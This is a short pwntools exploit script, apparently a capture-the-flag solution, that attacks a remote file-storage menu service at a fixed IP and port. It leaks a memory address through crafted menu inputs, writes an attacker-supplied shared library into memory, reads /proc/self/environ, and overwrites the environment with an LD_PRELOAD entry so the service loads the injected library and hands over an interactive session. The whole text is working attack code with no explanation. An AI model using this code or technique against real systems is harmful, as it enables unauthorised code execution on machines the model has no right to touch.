from pwn import *

HOST = "110.10.147.113"
#HOST = "localhost"


def put(file):
	r.sendlineafter(">","1")
	r.sendlineafter(":",file)
def get(file):
	r.sendlineafter(">","2")
	r.sendlineafter(":",file)


r = remote(HOST,6677)
#r.interactive()
r.sendlineafter(">","5")
r.sendlineafter("any key","")
r.sendlineafter(">","3")
r.recvuntil("Numbers")
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.sendline("+")
r.sendline("+")
r.sendline("+")
val = int(r.recvuntil(":")[:-1])
r.recvline()
r.sendline("1")
r.sendline("+")
val = (int(r.recvuntil(":")[:-1])<<32)+val
print hex(val)
r.sendline("1")
r.sendline("1")
r.sendline("1")

addr = val+0x40
environ = addr+0x158
import sys
target = environ-environ%0x1000+0x1000+0x271 #int(sys.argv[1],16)
print hex(target)
data = open("libtest.so").read()

filename = "J"*32
payload = filename.ljust(target-addr,"\x00")+data
put(payload)
get("/proc/self/environ".rjust(32,'/'))

payload = "a"*0x100+"LD_PRELOAD=./"+filename
payload = payload.ljust(0x158,"\x00")
put(payload+p64(addr+0x100)+p64(0))
r.sendlineafter(">","5")
r.sendline()
r.interactive()
